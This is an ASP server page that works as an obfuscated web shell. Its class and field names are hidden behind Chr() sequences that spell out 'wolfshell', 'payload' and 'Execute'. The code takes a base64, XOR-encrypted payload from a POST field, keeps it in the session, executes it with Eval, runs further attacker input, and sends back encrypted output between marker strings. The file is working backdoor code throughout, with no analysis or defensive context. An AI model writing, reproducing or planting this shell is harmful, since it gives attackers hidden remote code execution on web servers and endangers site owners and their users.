<%
Dim p_id_s_1, p_id_x_2, p_id_a_3, s_fld_a1, s_pay_a2, s_m1_a3, s_m2_a4
p_id_s_1 = Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(68)&Chr(105)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(97)&Chr(114)&Chr(121)
p_id_x_2 = Chr(77)&Chr(115)&Chr(120)&Chr(109)&Chr(108)&Chr(50)&Chr(46)&Chr(68)&Chr(79)&Chr(77)&Chr(68)&Chr(111)&Chr(99)&Chr(117)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(46)&Chr(51)&Chr(46)&Chr(48)
p_id_a_3 = Chr(65)&Chr(68)&Chr(79)&Chr(68)&Chr(66)&Chr(46)&Chr(83)&Chr(116)&Chr(114)&Chr(101)&Chr(97)&Chr(109)
s_fld_a1 = Chr(119)&Chr(111)&Chr(108)&Chr(102)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)
s_pay_a2 = Chr(112)&Chr(97)&Chr(121)&Chr(108)&Chr(111)&Chr(97)&Chr(100)
s_m1_a3 = "a"&"7"&"1"&"a"&"b"&"1"
s_m2_a4 = "4"&"b"&"8"&"2"&"5"&"9"

Set data_map_b1 = Server.CreateObject(p_id_s_1)
Dim secret_k_f1
secret_k_f1 = "3c6e0b8a9c15224a"

Function func_b64_dec_c1(ByVal v_c2)
    Dim x_c3, n_c4
    Set x_c3 = CreateObject(p_id_x_2)
    Set n_c4 = x_c3.CreateElement("base64")
    n_c4.dataType = "bin.base64"
    n_c4.text = v_c2
    func_b64_dec_c1 = n_c4.nodeTypedValue
    Set n_c4 = Nothing
    Set x_c3 = Nothing
End Function

Function func_b64_enc_d1(ByVal v_d2)
    Dim x_d3, n_d4
    Set x_d3 = CreateObject(p_id_x_2)
    Set n_d4 = x_d3.CreateElement("base64")
    n_d4.dataType = "bin.base64"
    n_d4.nodeTypedValue = v_d2
    func_b64_enc_d1 = n_d4.text
    Set n_d4 = Nothing
    Set x_d3 = Nothing
End Function

Function func_x_proc_e1(c_e2, b_e3)
    Dim sz_e4, i_e5, k_sz_e7, st_e9
    k_sz_e7 = len(secret_k_f1)
    Set st_e9 = CreateObject(p_id_a_3)
    st_e9.CharSet = "iso-8859-1"
    st_e9.Type = 2
    st_e9.Open
    if IsArray(c_e2) then
        sz_e4 = UBound(c_e2) + 1
        For i_e5 = 1 To sz_e4
            st_e9.WriteText chrw(ascb(midb(c_e2,i_e5,1)) Xor Asc(Mid(secret_k_f1,(i_e5 mod k_sz_e7)+1,1)))
        Next
    end if
    st_e9.Position = 0
    if b_e3 then
        st_e9.Type = 1
        func_x_proc_e1 = st_e9.Read()
    else
        func_x_proc_e1 = st_e9.ReadText()
    end if
End Function

Dim raw_dat_f2, res_f3
raw_dat_f2 = request.Form(s_fld_a1)
if not IsEmpty(raw_dat_f2) then
    if IsEmpty(Session(s_pay_a2)) then
        raw_dat_f2 = func_x_proc_e1(func_b64_dec_c1(raw_dat_f2),false)
        Session(s_pay_a2) = raw_dat_f2
        response.End
    else
        raw_dat_f2 = func_x_proc_e1(func_b64_dec_c1(raw_dat_f2),true)
        data_map_b1.Add s_pay_a2, Session(s_pay_a2)
        Dim exec_str_g1
        exec_str_g1 = Chr(69) & Chr(120) & Chr(101) & Chr(99) & Chr(117) & Chr(116) & Chr(101) & "(data_map_b1(""" & s_pay_a2 & """))"
        Eval(exec_str_g1)
        res_f3 = run(raw_dat_f2)
        response.Write(s_m1_a3)
        if not IsEmpty(res_f3) then
            response.Write func_b64_enc_d1(func_x_proc_e1(res_f3,true))
        end if
        response.Write(s_m2_a4)
    end if
end if
%>